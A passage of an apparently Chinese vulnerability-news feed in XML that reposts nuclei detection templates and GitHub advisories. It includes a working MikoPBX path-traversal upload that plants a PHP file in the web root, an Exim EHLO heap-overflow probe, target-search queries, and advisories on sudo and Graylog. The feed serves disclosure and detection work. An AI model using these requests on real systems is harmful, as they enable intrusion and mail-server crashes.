class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">author:</span> darses<br>  <span class="hljs-params">description:</span> |<br>    Detects CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">52207</span> <span class="hljs-keyword">in</span> MIKO MikoPBX by uploading a phpinfo() file a to random location.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/mikopbx/Core/commit/3ee785429d3f1b33c9ab387ef4221127c9b8c5f3</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.mikopbx.com<span class="hljs-symbol">/</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:L<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:L<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.9</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">52207</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">23</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00045</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.13694</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> miko<br>    <span class="hljs-params">product:</span> mikopbx<br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> product:<span class="hljs-string">&quot;mikopbx&quot;</span><br>      <span class="hljs-operator">-</span> http.favicon.hash:<span class="hljs-number">8309143</span><br>      <span class="hljs-operator">-</span> title:<span class="hljs-string">&quot;MikoPBX&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> icon_hash<span class="hljs-operator">=</span><span class="hljs-string">&quot;8309143&quot;</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;MikoPBX&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,mikopbx,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">filecontent:</span> <span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br>  <span class="hljs-params">filename:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_base(8))&#125;&#125;&quot;</span><br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/pbxcore/api/files/uploadFile&quot;</span><br><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> <span class="hljs-string">&quot;multipart/form-data; boundary=---------------------------&#123;&#123;filename&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">body:</span> |<br>      <span class="hljs-operator">-</span>----------------------------&#123;&#123;filename&#125;&#125;<br>      <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;resumableFilename&quot;</span><br><br>      &#123;&#123;filename&#125;&#125;.php<br>      <span class="hljs-operator">-</span>----------------------------&#123;&#123;filename&#125;&#125;<br>      <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;resumableIdentifier&quot;</span><br><br>      ..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>www<span class="hljs-operator">/</span>sites<span class="hljs-operator">/</span>admin-cabinet<span class="hljs-operator">/</span>&#123;&#123;filename&#125;&#125;<br>      <span class="hljs-operator">-</span>----------------------------&#123;&#123;filename&#125;&#125;<br>      <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&#123;filename&#125;&#125;.php&quot;</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/octet-stream</span><br><br>      &#123;&#123;filecontent&#125;&#125;<br>      <span class="hljs-operator">-</span>----------------------------&#123;&#123;filename&#125;&#125;<br>      <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;resumableChunkNumber&quot;</span><br><br>      <span class="hljs-number">1</span><br>      <span class="hljs-operator">-</span>----------------------------&#123;&#123;filename&#125;&#125;<br>      <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;resumableTotalChunks&quot;</span><br><br>      <span class="hljs-number">1</span><br>      <span class="hljs-operator">-</span>----------------------------&#123;&#123;filename&#125;&#125;<br>      <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;resumableTotalSize&quot;</span><br><br>      &#123;&#123;len(filecontent)&#125;&#125;<br>      <span class="hljs-operator">-</span>----------------------------&#123;&#123;filename&#125;&#125;--<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Content-Type: application/json&quot;</span><br>          <span class="hljs-operator">-</span> &#x27;&#123;<span class="hljs-string">&quot;jsonapi&quot;</span>:&#123;<span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-string">&quot;1.0&quot;</span>&#125;,<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;data&quot;</span>:&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">name:</span> upload_path<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> .data.filename<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">name:</span> extracted_path<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> replace_regex(upload_path, <span class="hljs-string">&quot;(.*)<span class="hljs-char escape_">\/</span>admin-cabinet<span class="hljs-char escape_">\/</span>&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/admin-cabinet/§extracted_path§?&#123;&#123;wait_for(5)&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; MIKO MikoPBX 相对路径遍历漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="目录穿越" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sudo before 1917p1 allows local users to obtain root access because /etc/nsswitchconf from a</title>
-    <link href="http://example.com/2025/06/30/github_3605194735/"/>
-    <id>http://example.com/2025/06/30/github_3605194735/</id>
-    <published>2025-06-30T22:00:05.146Z</published>
-    <updated>2025-06-30T22:00:05.144Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-695j-c63m-mvxc">https://github.com/advisories/GHSA-695j-c63m-mvxc</a></p><p><strong>CVSS 评分：</strong> 9.4</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32463">https://nvd.nist.gov/vuln/detail/CVE-2025-32463</a></p></li><li><p><a href="https://www.openwall.com/lists/oss-security/2025/06/30/3">https://www.openwall.com/lists/oss-security/2025/06/30/3</a></p></li><li><p><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot">https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot</a></p></li><li><p><a href="https://www.sudo.ws/releases/changelog">https://www.sudo.ws/releases/changelog</a></p></li><li><p><a href="https://www.sudo.ws/security/advisories">https://www.sudo.ws/security/advisories</a></p></li><li><p><a href="https://github.com/advisories/GHSA-695j-c63m-mvxc">https://github.com/advisories/GHSA-695j-c63m-mvxc</a></p></li></ul><p><strong>描述：</strong></p><p>Sudo before 1.9.17p1 allows local users to obtain root access because &#x2F;etc&#x2F;nsswitch.conf from a user-controlled directory is used with the –chroot option.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-695j-c63m-mvxc&quot;&gt;https://github.com/advisories/GHSA-695j-c63m-mvxc&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Graylog vulnerable to privilege escalation through API tokens</title>
-    <link href="http://example.com/2025/06/30/github_1029674936/"/>
-    <id>http://example.com/2025/06/30/github_1029674936/</id>
-    <published>2025-06-30T20:00:04.732Z</published>
-    <updated>2025-06-30T20:00:04.731Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-3m86-c9x3-vwm9">https://github.com/advisories/GHSA-3m86-c9x3-vwm9</a></p><p><strong>仓库 Star：</strong> 7713</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/Graylog2/graylog2-server/security/advisories/GHSA-3m86-c9x3-vwm9">https://github.com/Graylog2/graylog2-server/security/advisories/GHSA-3m86-c9x3-vwm9</a></p></li><li><p><a href="https://github.com/Graylog2/graylog2-server/commit/6936bd16a783c2944a3d2f1e83902062520f90e3">https://github.com/Graylog2/graylog2-server/commit/6936bd16a783c2944a3d2f1e83902062520f90e3</a></p></li><li><p><a href="https://github.com/Graylog2/graylog2-server/commit/9215b8f1fd32566c31e6f7447ed864df3590c157">https://github.com/Graylog2/graylog2-server/commit/9215b8f1fd32566c31e6f7447ed864df3590c157</a></p></li><li><p><a href="https://github.com/advisories/GHSA-3m86-c9x3-vwm9">https://github.com/advisories/GHSA-3m86-c9x3-vwm9</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>Graylog users can gain elevated privileges by creating and using API tokens for the local Administrator or any other user for whom the malicious user knows the ID.</p><p>For the attack to succeed, the attacker needs a user account in Graylog. They can then proceed to issue hand-crafted requests to the Graylog REST API and exploit a weak permission check for token creation.</p><h3 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h3><p>In Graylog version <code>6.2.0</code> and above, regular users can be restricted from creating API tokens. The respective configuration can be found in <code>System &gt; Configuration &gt; Users &gt; &quot;Allow users to create personal access tokens&quot;</code>. This option should be <em>Disabled</em>, so that only administrators are allowed to create tokens.</p><h3 id="Recommended-Actions"><a href="#Recommended-Actions" class="headerlink" title="Recommended Actions"></a>Recommended Actions</h3><p>After upgrading Graylog from a vulnerable version to a patched version, administrators are advised to perform the following steps to ensure the integrity of their system:</p><h4 id="Review-API-tokens"><a href="#Review-API-tokens" class="headerlink" title="Review API tokens"></a>Review API tokens</h4><p>An overview of all existing API tokens is available at <code>System &gt; Users and Teams &gt; Token Management</code>. Please review this list carefully and ensure each token is there for a reason.  </p><h4 id="Check-Audit-Log-Graylog-Enterprise-only"><a href="#Check-Audit-Log-Graylog-Enterprise-only" class="headerlink" title="Check Audit Log (Graylog Enterprise only)"></a>Check Audit Log (Graylog Enterprise only)</h4><p>Graylog Enterprise provides an audit log that can be used to review which API tokens were created when the system was vulnerable. Please search the Audit Log for <code>action:create token</code> and match the <em>Actor</em> with the user for whom the token was created. In most cases this should be the same user, but there might be legitimate reasons for users to be allowed to create tokens for other users. If in doubt, please review the user’s actual permissions.</p><h4 id="Review-API-token-creation-requests"><a href="#Review-API-token-creation-requests" class="headerlink" title="Review API token creation requests"></a>Review API token creation requests</h4><p>Graylog Open does not provide audit logging, but many setups contain infrastructure components, like reverse proxies, in front of the Graylog REST API. These components often provide HTTP access logs. Please check the access logs to detect malicious token creations by reviewing all API token requests to the <code>/api/users/&#123;user_id&#125;/tokens/&#123;token_name&#125;</code> endpoint (<code>&#123;user_id&#125;</code> and <code>&#123;token_name&#125;</code> may be arbitrary strings).</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-3m86-c9x3-vwm9&quot;&gt;https://github.com/advisories/GHSA-3m86-c9x3-vwm9&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Exim Heap Buffer Overflow Vulnerability</title>
-    <link href="http://example.com/2025/06/30/github_625433976/"/>
-    <id>http://example.com/2025/06/30/github_625433976/</id>
-    <published>2025-06-30T19:45:32.443Z</published>
-    <updated>2025-06-30T19:45:32.440Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Exim Heap Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-16928</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Exim版本4.92至4.92.2中的string_vformat()函数存在堆缓冲区溢出漏洞。攻击者可以通过发送超长的EHLO命令来崩溃Exim进程或可能实现远程代码执行。此漏洞影响运行易受攻击Exim版本的邮件服务器，可能允许攻击者中断邮件服务可用性或以Exim进程的权限执行任意代码。漏洞存在的原因是处理EHLO命令时长度验证不当，使得远程未认证攻击者可以通过发送特制的SMTP命令触发缓冲区溢出条件。</p><p><strong>产品厂商：</strong> exim</p><p><strong>产品名称：</strong> exim</p><p><strong>影响版本：</strong> 4.92 &lt;&#x3D; version &lt;&#x3D; 4.92.2</p><p><strong>搜索语法：</strong> banner&#x3D;”220” &amp;&amp; banner&#x3D;”ESMTP Exim”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/ca8255fdb638aeb7293c19e595d4cd1f09ba84d4/network%2Fcves%2F2019%2FCVE-2019-16928.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/ca8255fdb638aeb7293c19e595d4cd1f09ba84d4/network%2Fcves%2F2019%2FCVE-2019-16928.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">16928</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Exim <span class="hljs-number">4.9</span>2-<span class="hljs-number">4.92</span>.<span class="hljs-number">2</span> <span class="hljs-operator">-</span> Heap Buffer Overflow<br>  <span class="hljs-params">author:</span> mavrickrishi<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Exim versions <span class="hljs-number">4.92</span> through <span class="hljs-number">4.92</span>.<span class="hljs-number">2</span> contain a heap-based buffer overflow vulnerability <span class="hljs-keyword">in</span> the string_vformat()<br>    function <span class="hljs-keyword">in</span> string.c. The vulnerability can be exploited by sending an extraordinarily long EHLO command<br>    to crash the Exim process <span class="hljs-keyword">or</span> potentially achieve remote code execution. This flaw affects mail servers<br>    running vulnerable Exim versions, potentially allowing attackers to disrupt mail service availability<br>    <span class="hljs-keyword">or</span> execute arbitrary code <span class="hljs-keyword">with</span> the privileges of the Exim process. The vulnerability exists due to improper<br>    length validation when processing EHLO commands, making it possible for remote unauthenticated attackers<br>    to trigger a buffer overflow condition by sending a specially crafted SMTP command.<br>  <span class="hljs-params">remediation:</span> |<br>    Update Exim to version <span class="hljs-number">4.92</span>.<span class="hljs-number">3</span> <span class="hljs-keyword">or</span> later which includes the security fix for this vulnerability.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.exim.org/static/doc/security/CVE-2019-16928.txt</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>bugs.exim.org<span class="hljs-operator">/</span>show_bug.cgi<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span><span class="hljs-number">2449</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.openwall.com/lists/oss-security/2019/09/28/1</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//git.exim.org/exim.git/patch/478effbfd9c3cc5a627fc671d4bf94d13670d65f</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2019-16928</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">16928</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">122</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.0562</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.93279</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:exim:exim:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> exim<br>    <span class="hljs-params">product:</span> exim<br>    <span class="hljs-params">shodan-query:</span> <span class="hljs-string">&quot;Exim port:25&quot;</span><br>    <span class="hljs-params">fofa-query:</span> banner<span class="hljs-operator">=</span><span class="hljs-string">&quot;220&quot;</span> <span class="hljs-operator">&amp;&amp;</span> banner<span class="hljs-operator">=</span><span class="hljs-string">&quot;ESMTP Exim&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,exim,smtp,heap_overflow,rce,network,kev<br><br><span class="hljs-params">tcp:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-comment"># Send EHLO command with 1200 &#x27;A&#x27; characters to trigger heap buffer overflow</span><br>      <span class="hljs-comment"># This length exceeds the vulnerable buffer size in string_vformat() function</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;EHLO &#123;&#123;repeat(&#x27;A&#x27;, 1200)&#125;&#125;.test<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Host&#125;&#125;:25&quot;</span>    <span class="hljs-comment"># Standard SMTP port</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Host&#125;&#125;:587&quot;</span>   <span class="hljs-comment"># SMTP submission port</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Host&#125;&#125;:465&quot;</span>   <span class="hljs-comment"># SMTPS (SMTP over SSL) port</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Host&#125;&#125;:8825&quot;</span>  <span class="hljs-comment"># Custom test port</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-comment"># Check for vulnerable Exim version (4.92.0, 4.92.1, or 4.92.2)</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;ESMTP Exim 4.92&quot;</span><br>          <span class="hljs-comment"># Check for service crash response indicating successful exploitation</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;421&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> data<br>        <span class="hljs-params">name:</span> exim_version<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-comment"># Extract specific vulnerable version number for reporting</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;ESMTP Exim (4<span class="hljs-char escape_">\\</span>.92<span class="hljs-char escape_">\\</span>.[0-2])&quot;</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> data<br>        <span class="hljs-params">name:</span> hostname<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-comment"># Extract hostname from SMTP banner for additional context</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;220 ([^<span class="hljs-char escape_">\\</span>s]+)&quot;</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Exim Heap Buffer Overflow Vulnerability</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Exim Heap Buffer Overflow Vulnerability</title>
-    <link href="http://example.com/2025/06/30/github_3511826890/"/>
-    <id>http://example.com/2025/06/30/github_3511826890/</id>
-    <published>2025-06-30T19:45:18.139Z</published>
-    <updated>2025-06-30T19:45:18.140Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Exim Heap Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-16928</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Exim 4.92至4.92.2版本中存在一个堆缓冲区溢出漏洞，位于string.c文件的string_vformat函数中，涉及一个长的EHLO命令。远程攻击者可以通过发送特制的EHLO命令来执行任意代码。</p><p><strong>产品厂商：</strong> Exim</p><p><strong>产品名称：</strong> Exim</p><p><strong>影响版本：</strong> 4.92 &lt;&#x3D; version &lt;&#x3D; 4.92.2</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:a:exim:exim”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12169">https://github.com/projectdiscovery/nuclei-templates/issues/12169</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Exim 4.92 through 4.92.2 contains a remote code execution caused by a heap-based buffer overflow in string_vformat in string.c involving a long EHLO command, letting remote attackers execute arbitrary code, exploit requires sending a specially crafted EHLO command.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="http://www.openwall.com/lists/oss-security/2019/09/28/1">http://www.openwall.com/lists/oss-security/2019/09/28/1</a></li><li><a href="http://www.openwall.com/lists/oss-security/2019/09/28/2">http://www.openwall.com/lists/oss-security/2019/09/28/2</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-a-exim-exim"><a href="#Shodan-Query-cpe-cpe-2-3-a-exim-exim" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:a:exim:exim&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:a:exim:exim&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug 